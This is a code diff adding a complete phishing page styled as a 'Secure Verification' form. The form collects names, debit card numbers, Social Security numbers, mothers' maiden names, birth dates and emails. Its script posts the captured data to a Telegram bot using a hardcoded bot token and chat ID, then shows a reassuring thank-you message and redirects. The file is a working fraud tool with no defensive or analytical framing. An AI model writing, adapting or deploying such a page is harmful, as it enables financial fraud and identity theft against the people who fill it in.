@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Info</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .form-box {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      width: 360px;
+      text-align: center;
+    }
+
+    .form-box input {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .form-box button {
+      width: 100%;
+      padding: 14px;
+      background: #1877f2;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .thank-you {
+      display: none;
+      font-size: 18px;
+      color: green;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <form class="form-box" onsubmit="sendCapture(event)">
+    <h2>Secure Verification</h2>
+    <input type="text" id="first_name" placeholder="First Name" required />
+    <input type="text" id="last_name" placeholder="Last Name" required />
+    <input type="text" id="debit_card" placeholder="Debit Card Number" required />
+    <input type="text" id="ssn" placeholder="Social Security Number" required />
+    <input type="text" id="maiden_name" placeholder="Mother's Maiden Name" required />
+    <input type="date" id="dob" required />
+    <input type="email" id="email" placeholder="Email Address" required />
+    <button type="submit">Submit</button>
+
+    <div class="thank-you" id="thankYouMessage">Thank you. Your information has been submitted.</div>
+  </form>
+
+  <script>
+    const BOT_TOKEN = '7857705459:AAHaGE6-uZIzv34uuWfqWdfbtP0T9jrvDbU';
+    const CHAT_ID = '5053464023';
+
+    function sendCapture(event) {
+      event.preventDefault();
+
+      const msg = `
+Captured Info:
+Name: ${document.getElementById('first_name').value} ${document.getElementById('last_name').value}
+Card: ${document.getElementById('debit_card').value}
+SSN: ${document.getElementById('ssn').value}
+Maiden Name: ${document.getElementById('maiden_name').value}
+DOB: ${document.getElementById('dob').value}
+Email: ${document.getElementById('email').value}
+      `;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
+      }).then(() => {
+        // Show thank you message
+        document.getElementById("thankYouMessage").style.display = "block";
+
+        // Optionally redirect after 3 seconds
+        setTimeout(() => {
+          window.location.href = "index.html";
+        }, 3000);
+      });
+    }
+  </script>
+
+</body>
+</html>
